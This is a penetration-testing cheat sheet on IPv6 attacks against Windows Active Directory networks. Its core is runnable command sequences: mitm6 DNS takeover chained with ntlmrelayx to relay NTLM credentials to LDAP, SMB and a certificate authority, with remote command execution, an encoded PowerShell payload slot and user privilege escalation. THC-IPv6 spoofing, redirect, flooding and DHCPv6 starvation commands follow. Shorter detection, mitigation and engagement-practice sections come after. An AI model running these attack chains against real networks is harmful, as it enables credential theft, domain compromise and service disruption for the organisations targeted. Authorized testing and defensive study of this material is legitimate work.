# IPv6 Attacks

## Overview
IPv6 attacks exploit the fact that many Windows environments have IPv6 enabled by default but lack proper IPv6 security configurations. These attacks can be particularly effective because IPv6 traffic is often less monitored than IPv4.

## mitm6 - IPv6 DNS Takeover

### What is mitm6?
- Python tool for exploiting IPv6 in Windows/Active Directory environments
- Leverages Windows' preference for IPv6 over IPv4
- Performs DNS takeover via IPv6 Router Advertisements
- Created by Fox-IT for red team operations

### How mitm6 Works
1. **Router Advertisement Spoofing**: Sends fake IPv6 Router Advertisements
2. **DNS Server Assignment**: Sets attacker machine as primary DNS server for IPv6
3. **Traffic Interception**: Captures and redirects DNS queries
4. **WPAD Exploitation**: Exploits Web Proxy Auto-Discovery via IPv6
5. **Credential Harvesting**: Collects NTLM hashes through forced authentication

### Installation
```bash
# Install via pip
pip3 install mitm6

# Or clone from GitHub
git clone https://github.com/fox-it/mitm6.git
cd mitm6
pip3 install -r requirements.txt
python3 setup.py install
```

### Basic Usage

#### Simple DNS Takeover
```bash
# Basic attack against domain
mitm6 -d domain.local

# Specify network interface
mitm6 -d domain.local -i eth0

# Verbose output
mitm6 -d domain.local -v

# Specify custom DNS server to forward legitimate queries
mitm6 -d domain.local --dns-server 192.168.1.1
```

#### Advanced Options
```bash
# Ignore specific hosts
mitm6 -d domain.local --ignore-hosts dc01.domain.local,dc02.domain.local

# Custom domain for WPAD
mitm6 -d domain.local --wpad-domain evil.local

# Disable Router Advertisement
mitm6 -d domain.local --no-ra

# Custom IPv6 prefix
mitm6 -d domain.local --ipv6-prefix 2001:db8::/64
```

### Combining with ntlmrelayx

#### Setup 1: LDAP Relay
```bash
# Terminal 1 - Start mitm6
mitm6 -d domain.local

# Terminal 2 - NTLM relay to LDAP
ntlmrelayx.py -t ldaps://dc.domain.local -wh fakewpad.domain.local -6
```

#### Setup 2: SMB Relay
```bash
# Terminal 1 - Start mitm6
mitm6 -d domain.local

# Terminal 2 - NTLM relay to SMB
ntlmrelayx.py -tf targets.txt -wh fakewpad.domain.local -6 -c whoami
```

#### Setup 3: Multiple Targets
```bash
# Terminal 1 - Start mitm6
mitm6 -d domain.local

# Terminal 2 - Relay with multiple protocols
ntlmrelayx.py -tf targets.txt -wh fakewpad.domain.local -6 \
  -c "powershell.exe -enc <base64_payload>"
```

### Attack Scenarios

#### Scenario 1: Domain Credential Harvesting
```bash
# Step 1: Start mitm6 to capture IPv6 traffic
mitm6 -d corp.local -v

# Step 2: Set up NTLM relay (separate terminal)
ntlmrelayx.py -t ldaps://dc01.corp.local -wh fakewpad.corp.local -6

# Step 3: Wait for machines to request WPAD configuration
# Credentials will be captured automatically
```

#### Scenario 2: Machine Account Takeover
```bash
# Target domain controllers for machine account relay
mitm6 -d domain.local

# Relay machine accounts to LDAP for privilege escalation
ntlmrelayx.py -t ldaps://dc.domain.local -wh fakewpad.domain.local -6 \
  --escalate-user lowprivuser
```

#### Scenario 3: Certificate Authority Targeting
```bash
# Target Certificate Authority for certificate templates
mitm6 -d domain.local

# Relay to ADCS for certificate request
ntlmrelayx.py -t https://ca.domain.local/certsrv/ -wh fakewpad.domain.local -6
```

### Detection and Monitoring

#### Network Indicators
```bash
# Monitor for suspicious IPv6 Router Advertisements
tcpdump -i eth0 icmp6 and 'ip6[40] = 134'

# Monitor for IPv6 DNS queries to unexpected servers
tcpdump -i eth0 'ip6 and port 53'

# Check for WPAD requests over IPv6
tcpdump -i eth0 'ip6 and port 80 and host fakewpad'
```

#### Windows Event Logs
- Event ID 4648: Explicit credential logon
- Event ID 4624: Successful logon (Type 3 - Network)
- Event ID 5156: Windows Filtering Platform connection allowed

#### PowerShell Detection
```powershell
# Check IPv6 configuration
Get-NetIPConfiguration | Where-Object {$_.IPv6Address -ne $null}

# Monitor IPv6 DNS servers
Get-DnsClientServerAddress -AddressFamily IPv6

# Check for suspicious WPAD configuration
Get-WinHttpSettings
```

### Mitigation Strategies

#### Network Level
```bash
# Disable IPv6 if not needed (Registry)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v DisabledComponents /t REG_DWORD /d 255 /f

# Configure proper IPv6 security policies
# Implement IPv6 access control lists (ACLs)
# Monitor IPv6 traffic with IDS/IPS
```

#### Active Directory Level
```bash
# Enable LDAP signing
# Require SMB signing
# Implement LAPS for local admin passwords
# Use Protected Users group for sensitive accounts
```

#### Group Policy Settings
```
Computer Configuration > Administrative Templates > Network > DNS Client
- Turn off multicast name resolution: Enabled

Computer Configuration > Administrative Templates > Network > Network Connections
- Prohibit installation and configuration of Network Bridge: Enabled
```

## Other IPv6 Attacks

### 1. Neighbor Discovery Poisoning
```bash
# Use parasite6 for neighbor discovery attacks
parasite6 -l eth0

# Use fake_router6 for router advertisement attacks
fake_router6 -a eth0 2001:db8::1/64
```

### 2. ICMPv6 Redirect Attacks
```bash
# Redirect IPv6 traffic
redir6 eth0 victim_ipv6 attacker_ipv6 target_ipv6
```

### 3. DHCPv6 Starvation
```bash
# Exhaust DHCPv6 pool
dos-new-ip6 eth0
```

## Tools and Resources

### Essential Tools
- **mitm6**: IPv6 DNS takeover and WPAD exploitation
- **THC-IPv6**: Comprehensive IPv6 attack toolkit
- **Scapy**: Python packet manipulation for custom IPv6 attacks
- **Wireshark**: IPv6 traffic analysis and monitoring

### THC-IPv6 Toolkit
```bash
# Install THC-IPv6
apt-get install thc-ipv6

# Scan for IPv6 hosts
alive6 eth0

# IPv6 address spoofing
spoof6 eth0 victim_ipv6 attacker_ipv6

# Router advertisement flooding
flood_router6 eth0
```

### Custom Scripts
```python
# Example: Simple IPv6 scanner with Scapy
from scapy.all import *

def ipv6_scan(target_network):
    for i in range(1, 255):
        target = f"{target_network}::{i}"
        packet = IPv6(dst=target)/ICMPv6EchoRequest()
        response = sr1(packet, timeout=1, verbose=0)
        if response:
            print(f"Host alive: {target}")

# Usage
ipv6_scan("2001:db8")
```

## Best Practices for Testing

### Pre-Engagement
1. Verify IPv6 is in scope
2. Understand network topology
3. Identify critical IPv6-enabled systems
4. Plan for potential service disruption

### During Testing
1. Monitor network impact
2. Document all discovered IPv6 addresses
3. Test during approved hours
4. Have rollback procedures ready

### Post-Engagement
1. Provide detailed remediation steps
2. Include IPv6 security recommendations
3. Suggest monitoring improvements
4. Offer IPv6 security training

## Common Pitfalls and Troubleshooting

### Issues and Solutions
```bash
# Issue: mitm6 not receiving traffic
# Solution: Check IPv6 is enabled on targets
ip -6 addr show

# Issue: NTLM relay not working
# Solution: Verify SMB/LDAP signing configuration
nmap --script smb2-security-mode -p 445 target

# Issue: No WPAD requests
# Solution: Check proxy settings and domain configuration
netsh winhttp show proxy
```

### Testing Validation
```bash
# Verify IPv6 DNS takeover
nslookup wpad.domain.local
# Should resolve to attacker IP

# Check IPv6 routing
ip -6 route show
# Should show attacker as default gateway

# Validate NTLM capture
# Check ntlmrelayx output for captured hashes
```

## References and Further Reading

- [mitm6 GitHub Repository](https://github.com/fox-it/mitm6)
- [IPv6 Security Best Practices - NIST](https://csrc.nist.gov/publications/detail/sp/800-119/final)
- [THC-IPv6 Attack Toolkit](https://github.com/vanhauser-thc/thc-ipv6)
- [RFC 4861 - Neighbor Discovery for IPv6](https://tools.ietf.org/html/rfc4861)
- [SANS IPv6 Security Guide](https://www.sans.org/white-papers/33649/)

---

**Note**: Always ensure proper authorization before conducting IPv6 attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 